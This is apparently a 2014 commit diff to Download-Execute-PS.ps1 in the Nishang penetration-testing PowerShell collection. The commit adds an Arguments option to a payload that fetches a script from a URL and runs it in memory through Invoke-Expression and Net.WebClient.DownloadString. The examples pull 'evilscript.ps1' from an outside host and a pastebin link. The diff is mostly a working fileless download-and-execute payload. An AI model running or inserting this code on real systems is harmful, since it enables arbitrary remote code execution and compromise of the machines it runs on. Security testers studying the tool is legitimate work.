bf43c4fc76fc7360c4304c3ccba651bf45b57de7
samratashok <nikhil.uitrgpv@gmail.com>
2014-06-23 13:38:06 +0530

    Minor changes to Download-Execute-PS

--- Execution/Download-Execute-PS.ps1
+++ Execution/Download-Execute-PS.ps1
@@ -9,15 +9,21 @@ This payload downloads a powershell script from specified URL and then executes 
 .PARAMETER ScriptURL
 The URL from where the powershell script would be downloaded.
 
+.PARAMETER Arguments
+The Arguments to pass to the script when it is not downloaded to disk i.e. with -nodownload function.
+
+.PARAMETER Nodownload
+If this switch is used, the script is not dowloaded to the disk.
+
 .EXAMPLE
 PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x
 
 .EXAMPLE
-PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript -nodownload
-The above command does not dowload the script file to disk.
+PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript.ps1 -Argument evilscript -nodownload
+The above command does not dowload the script file to disk and executes the evilscript function inside the evilscript.ps1
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
+http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
 
@@ -31,14 +37,21 @@ function Download-Execute-PS
         [String]
         $ScriptURL,
 
-        [Parameter(Position = 1)]
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $Arguments,
+
         [Switch]
         $nodownload
     )
 
     if ($nodownload -eq $true)
     {
-        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
+        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
+        if($Arguments)
+        {
+            Invoke-Expression $Arguments
+        }
     }
     
     else
